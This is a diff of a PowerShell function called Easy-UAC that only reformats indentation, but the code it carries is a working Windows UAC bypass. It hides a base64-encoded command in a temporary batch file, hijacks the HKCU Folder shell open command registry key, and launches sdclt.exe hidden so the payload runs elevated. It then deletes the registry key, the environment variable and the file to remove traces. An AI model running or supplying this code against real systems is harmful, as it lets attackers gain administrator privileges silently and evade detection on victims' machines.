@@ -1,12 +1,12 @@
 function Easy-UAC {
 	[CmdletBinding()]
-    Param(
-        [Parameter(Mandatory = $true, Position = 0)]
-        [ValidateNotNullOrEmpty()]
-        [string]
-        $Command
-    )
-    powershell -WindowStyle Hidden -c ""
+	Param(
+		[Parameter(Mandatory = $true, Position = 0)]
+		[ValidateNotNullOrEmpty()]
+		[string]
+		$Command
+	)
+	powershell -WindowStyle Hidden -c ""
 	$encCommand = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($Command))
 	$Path = $env:TEMP + '\A.bat'
 	$Value = "powershell -WindowStyle Hidden -c Remove-Item $Path;[System.Environment]::SetEnvironmentVariable('A', '',[System.EnvironmentVariableTarget]::User);IEX([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('" + $encCommand + "')))"
@@ -18,8 +18,8 @@ function Easy-UAC {
 	Start-Process cmd.exe "/c start /min sdclt.exe" -WindowStyle Hidden
 	sleep 3
 	Remove-Item "HKCU:\Software\Classes\Folder\shell\open\command"
-    [System.Environment]::SetEnvironmentVariable('A', '',[System.EnvironmentVariableTarget]::User)
-    Remove-Item $Path
-    Exit
-    Exit
+	[System.Environment]::SetEnvironmentVariable('A', '',[System.EnvironmentVariableTarget]::User)
+	Remove-Item $Path
+	Exit
+	Exit
 }
